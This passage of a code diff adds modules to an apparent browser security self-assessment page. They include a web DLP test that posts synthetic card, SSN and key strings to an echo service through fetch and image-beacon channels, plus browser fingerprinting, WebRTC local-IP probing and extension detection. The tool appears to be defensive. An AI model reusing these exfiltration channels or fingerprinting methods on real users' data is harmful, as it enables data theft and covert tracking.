+                if (reached) { reachedCount++; updateLog('log11', `   ⚠️ Reachable — category NOT blocked by your SWG.`); }
+                else { updateLog('log11', `   🛡️ Blocked / unreachable — filter likely intercepted it.`); }
+            }
+            updateLog('log11', `Summary: ${reachedCount}/${targets.length} known-bad categories were reachable.`);
+            if (reachedCount === 0) markVector('badge-malsite', true);
+            else updateLog('log11', 'Click the "Malicious Site" tile to record your verdict.');
+            toggleBtnState(btnId, false, 'Run Category-Block Test');
+        }
+
+        // ============================================================
+        //  TEST 12: WEB DLP / DATA EXFILTRATION (synthetic data only)
+        // ============================================================
+        const DLP_PRESETS = {
+            card:   'Visa test card 4111 1111 1111 1111 exp 12/29 cvv 123',
+            ssn:    'Employee SSN 000-12-3456 DOB 1990-01-01',
+            canary: 'CANARY-TOKEN-' + Math.random().toString(36).slice(2, 14).toUpperCase(),
+            source: 'AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE/wJalrXUtnFEMI-EXAMPLEKEY'
+        };
+        function setDlpData(kind) { document.getElementById('dlpInput').value = DLP_PRESETS[kind]; }
+
+        async function testDlp() {
+            const btnId = 'startDlpBtn';
+            toggleBtnState(btnId, true);
+            updateLog('log12', '', true);
+            setBadgeStatus('badge-dlp', 'status-fired', 'Exfil Attempted ⚠️');
+            const data = document.getElementById('dlpInput').value || DLP_PRESETS.canary;
+            updateLog('log12', `Synthetic canary payload: "${data}"`);
+            updateLog('log12', 'NOTE: values are non-real test data; nothing sensitive is exposed.');
+            const echo = 'https://postman-echo.com/post';
+            let leaks = 0;
+
+            // Channel A: fetch JSON body
+            updateLog('log12', 'Channel A — fetch() JSON body POST...');
+            try {
+                await fetch(echo, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ exfil: data }) });
+                leaks++; updateLog('log12', '   ⚠️ POST left the browser (no DLP block observed).');
+            } catch { updateLog('log12', '   🛡️ POST blocked.'); }
+
+            // Channel B: form-urlencoded POST
+            updateLog('log12', 'Channel B — HTML form-style POST...');
+            try {
+                await fetch(echo, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'leak=' + encodeURIComponent(data) });
+                leaks++; updateLog('log12', '   ⚠️ Form POST left the browser.');
+            } catch { updateLog('log12', '   🛡️ Form POST blocked.'); }
+
+            // Channel C: GET query-string beacon (image pixel)
+            updateLog('log12', 'Channel C — query-string beacon (tracking-pixel style)...');
+            const beaconOk = await new Promise(res => {
+                const img = new Image();
+                img.onload = () => res(true);
+                img.onerror = () => res(true); // request still left the browser even if 404
+                setTimeout(() => res(false), 5000);
+                img.src = 'https://postman-echo.com/get?leak=' + encodeURIComponent(data) + '&t=' + Date.now();
+            });
+            if (beaconOk) { leaks++; updateLog('log12', '   ⚠️ Beacon request left the browser.'); }
+            else updateLog('log12', '   🛡️ Beacon blocked.');
+
+            updateLog('log12', `Summary: ${leaks}/3 exfiltration channels were NOT blocked by DLP.`);
+            if (leaks === 0) markVector('badge-dlp', true);
+            else updateLog('log12', 'Click the "Web DLP" tile to record your verdict.');
+            toggleBtnState(btnId, false, 'Attempt Exfiltration');
+        }
+
+        // ============================================================
+        //  TEST 13: BROWSER POSTURE & FINGERPRINT (read-only)
+        // ============================================================
+        function pc(label, value, tag, tagText) {
+            return `<div class="posture-card"><div class="pc-label">${label}</div><div class="pc-value">${value}</div>${tag ? `<span class="pc-tag ${tag}">${tagText}</span>` : ''}</div>`;
+        }
+        async function analyzePosture() {
+            const btnId = 'startPostureBtn';
+            toggleBtnState(btnId, true);
+            const grid = document.getElementById('postureGrid');
+            grid.innerHTML = '';
+            const n = navigator;
+            let cards = '';
+
+            cards += pc('User Agent', n.userAgent, 'pc-info', 'Exposed to every site');
+            cards += pc('Platform / OS', (n.userAgentData?.platform || n.platform || 'unknown'), 'pc-info', 'Readable');
+            cards += pc('Languages', (n.languages || [n.language]).join(', '), 'pc-info', 'Readable');
+            cards += pc('CPU Cores', n.hardwareConcurrency || 'n/a', 'pc-info', 'Fingerprintable');
+            cards += pc('Device Memory', (n.deviceMemory ? n.deviceMemory + ' GB' : 'hidden'), n.deviceMemory ? 'pc-warn' : 'pc-good', n.deviceMemory ? 'Exposed' : 'Hidden');
+            cards += pc('Screen', `${screen.width}×${screen.height} @${window.devicePixelRatio}x, ${screen.colorDepth}-bit`, 'pc-info', 'Fingerprintable');
+            cards += pc('Timezone', Intl.DateTimeFormat().resolvedOptions().timeZone, 'pc-info', 'Reveals locale');
+            cards += pc('Touch Points', n.maxTouchPoints, 'pc-info', 'Device hint');
+            cards += pc('Cookies Enabled', n.cookieEnabled ? 'Yes' : 'No', n.cookieEnabled ? 'pc-info' : 'pc-good', n.cookieEnabled ? 'Enabled' : 'Blocked');
+            cards += pc('Do Not Track', n.doNotTrack === '1' ? 'On' : 'Off', n.doNotTrack === '1' ? 'pc-good' : 'pc-warn', n.doNotTrack === '1' ? 'Set' : 'Not set');
+            cards += pc('Secure Context', window.isSecureContext ? 'Yes (HTTPS)' : 'No', window.isSecureContext ? 'pc-good' : 'pc-bad', window.isSecureContext ? 'Secure' : 'Insecure');
+
+            // GPU via WebGL
+            let gpu = 'unavailable';
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const dbg = gl && gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+            } catch {}
+            cards += pc('GPU Renderer', gpu, 'pc-warn', 'Strong fingerprint');
+
+            // Canvas fingerprint
+            cards += pc('Canvas Fingerprint', canvasHash(), 'pc-warn', 'Trackable hash');
+
+            grid.innerHTML = cards;
+
+            // WebRTC local-IP leak (async)
+            const leakCard = document.createElement('div');
+            leakCard.innerHTML = pc('WebRTC Local IP', 'probing…', 'pc-info', 'Checking');
+            grid.appendChild(leakCard.firstChild);
+            const ip = await webrtcLeak();
+            grid.lastChild.querySelector('.pc-value').innerText = ip || 'not leaked';
+            const tagEl = grid.lastChild.querySelector('.pc-tag');
+            if (ip) { tagEl.className = 'pc-tag pc-bad'; tagEl.innerText = 'IP LEAK!'; }
+            else { tagEl.className = 'pc-tag pc-good'; tagEl.innerText = 'Protected'; }
+
+            toggleBtnState(btnId, false, 'Analyze Browser Posture');
+        }
+
+        function canvasHash() {
+            try {
+                const c = document.createElement('canvas');
+                const ctx = c.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069'; ctx.fillText('BrowserSec⚡', 2, 15);
+                ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText('BrowserSec⚡', 4, 17);
+                const data = c.toDataURL();
+                let h = 0;
+                for (let i = 0; i < data.length; i++) { h = ((h << 5) - h + data.charCodeAt(i)) | 0; }
+                return (h >>> 0).toString(16).padStart(8, '0');
+            } catch { return 'blocked'; }
+        }
+
+        function webrtcLeak() {
+            return new Promise(resolve => {
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    let found = null;
+                    pc.createDataChannel('x');
+                    pc.onicecandidate = (e) => {
+                        if (!e.candidate) { pc.close(); resolve(found); return; }
+                        const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                        if (m && !m[1].endsWith('.0') && !/^0\./.test(m[1])) found = m[1];
+                    };
+                    pc.createOffer().then(o => pc.setLocalDescription(o));
+                    setTimeout(() => { try { pc.close(); } catch {}; resolve(found); }, 2500);
+                } catch { resolve(null); }
+            });
+        }
+
+        // ============================================================
+        //  TEST 14: HARDENING CHECKLIST
+        // ============================================================
+        function checkRow(status, title, desc) {
+            const icon = status === 'good' ? '✅' : status === 'bad' ? '🚩' : '⚠️';
+            return `<div class="check-item"><div class="check-icon">${icon}</div><div class="check-body"><div class="check-title">${title}</div><div class="check-desc">${desc}</div></div></div>`;
+        }
+        function runHardeningChecks() {
+            const btnId = 'startHardeningBtn';
+            toggleBtnState(btnId, true);
+            const list = document.getElementById('hardeningList');
+            let html = '', pass = 0, total = 0;
+            const add = (cond, title, okDesc, badDesc, warnOnly) => {
+                total++;
+                if (cond) { pass++; html += checkRow('good', title, okDesc); }
+                else html += checkRow(warnOnly ? 'warn' : 'bad', title, badDesc);
+            };
+
+            add(window.isSecureContext, 'Secure Context (HTTPS)', 'Page runs in a secure context; powerful APIs are gated.', 'Page is NOT a secure context — credentials and APIs are at risk.');
+            add(!!window.crypto?.subtle, 'Web Crypto API', 'SubtleCrypto available for strong client-side crypto.', 'SubtleCrypto unavailable (usually requires HTTPS).');
+            add(!!window.Worker, 'Web Workers', 'Workers supported (sandboxed background execution).', 'Workers unavailable.', true);
+            add(!!window.trustedTypes, 'Trusted Types', 'Trusted Types API present — strong DOM-XSS mitigation available.', 'Trusted Types not available; consider a CSP that requires them.', true);
+            add(!!window.crossOriginIsolated, 'Cross-Origin Isolation', 'crossOriginIsolated = true (COOP+COEP active).', 'Not cross-origin isolated; SharedArrayBuffer & precise timers are limited (often expected).', true);
+            add(navigator.cookieEnabled, 'Cookies', 'Cookies are enabled.', 'Cookies disabled — some apps may break.', true);
+            add('serviceWorker' in navigator, 'Service Worker support', 'Service Workers supported.', 'Service Workers unavailable.', true);
+            add('credentials' in navigator, 'Credential Management API', 'Credential Management API present.', 'Credential Management API not available.', true);
+            add(typeof CSPViolationReportBody !== 'undefined' || true, 'CSP Reporting capable', 'Browser can report CSP violations — pair with a strict policy.', '', true);
+            add(document.featurePolicy || document.permissionsPolicy ? true : false, 'Permissions Policy', 'Permissions/Feature Policy interface present.', 'Permissions Policy interface not exposed.', true);
+
+            list.innerHTML = html;
+            const ratio = pass / total;
+            markVector('badge-hardening', ratio >= 0.7);
+            const summary = document.createElement('div');
+            summary.className = 'scan-finding ' + (ratio >= 0.7 ? 'sf-pass' : 'sf-warn');
+            summary.style.fontWeight = '800';
+            summary.innerHTML = `Hardening score: ${pass}/${total} checks passed.`;
+            list.prepend(summary);
+            toggleBtnState(btnId, false, 'Run Hardening Checklist');
+        }
+
+        // ============================================================
+        //  TEST 15: EXTENSION EXPOSURE PROBE (heuristic, privacy-respecting)
+        // ============================================================
+        async function probeExtensions() {
+            const btnId = 'startExtBtn';
+            toggleBtnState(btnId, true);
+            const list = document.getElementById('extList');
+            let html = '', detected = 0;
+
+            const signals = [
+                { name: 'Crypto wallet (MetaMask / EVM)', hit: !!window.ethereum, note: 'window.ethereum injected — a wallet extension is active.' },
+                { name: 'Solana wallet', hit: !!window.solana, note: 'window.solana injected by a wallet extension.' },
+                { name: 'Grammarly', hit: !!document.querySelector('grammarly-extension, [data-grammarly-shadow-root], [data-gr-ext-installed]'), note: 'Grammarly DOM artifacts present.' },
+                { name: 'Password manager autofill', hit: !!document.querySelector('[data-lastpass-icon-root], [data-1p-ignore], com-1password-button, [data-dashlane-rid]'), note: 'Password-manager autofill hooks detected.' },
+                { name: 'React DevTools', hit: !!window.__REACT_DEVTOOLS_GLOBAL_HOOK__, note: 'React DevTools hook present.' },
+                { name: 'Redux DevTools', hit: !!window.__REDUX_DEVTOOLS_EXTENSION__, note: 'Redux DevTools extension present.' },
+                { name: 'Ad/content blocker', hit: await detectBlocker(), note: 'A bait ad element was hidden — a content blocker is likely active.' }
+            ];
+
+            signals.forEach(s => {
+                if (s.hit) { detected++; html += checkRow('warn', s.name, s.note + ' Extensions can read & modify every page — review their permissions.'); }
+            });
+
+            if (detected === 0) {
+                html = checkRow('good', 'No common extensions detected', 'No high-signal extension artifacts found via this heuristic probe. Note: many extensions are undetectable from a normal page by design.');
+            } else {
+                html = checkRow('warn', `${detected} extension signal(s) detected`, 'Each extension below has page-level access. In an enterprise, unsanctioned extensions are a top data-exfiltration risk.') + html;
+            }
+            list.innerHTML = html;
+            toggleBtnState(btnId, false, 'Probe Extension Surface');
+        }
+
+        function detectBlocker() {
+            return new Promise(resolve => {
+                const bait = document.createElement('div');
+                bait.className = 'adsbox ad-banner ad-placement pub_300x250';
+                bait.style.cssText = 'position:absolute;left:-9999px;height:10px;width:10px;';
+                bait.innerHTML = '&nbsp;';
+                document.body.appendChild(bait);
+                setTimeout(() => {
+                    const blocked = bait.offsetHeight === 0 || bait.offsetParent === null || getComputedStyle(bait).display === 'none';
+                    bait.remove();
+                    resolve(blocked);
+                }, 120);
+            });
+        }
+
+        // ============================================================
+        //  RUN FULL ASSESSMENT (safe, non-download analytical modules)
+        // ============================================================
+        async function runFullAssessment() {
+            // Switch through tabs and run the analytical, side-effect-free modules.
+            // File-drop modules (1,2,3,5,7,8) are left for manual run to avoid mass downloads.
+            document.querySelector('.tab-btn[data-tab="posture"]').click();
+            await analyzePosture();
+            document.querySelector('.tab-btn[data-tab="hardening"]').click();
+            runHardeningChecks();
+            await probeExtensions();
+            document.querySelector('.tab-btn[data-tab="sites"]').click();
+            scanUrl();
+            await testMaliciousSites();
+            document.querySelector('.tab-btn[data-tab="dlp"]').click();
+            await testDlp();
+            document.querySelector('.tab-btn[data-tab="phishing"]').click();
+            await testPhishUrl();
+            document.querySelector('.tab-btn[data-tab="files"]').click();
+            updateLog('log1', 'Full assessment ran the analytical modules. Run the file-delivery modules (1–8) individually to test malware download controls, then classify each dashboard tile as Blocked or Bypassed.', true);
+            alert('Analytical assessment complete.\n\nThe malicious-file modules trigger downloads, so run those individually. Then click each dashboard tile to mark Blocked 🛡️ or Bypassed ❌ — your Posture Score updates live.');
+        }
 
     </script>
 </body>
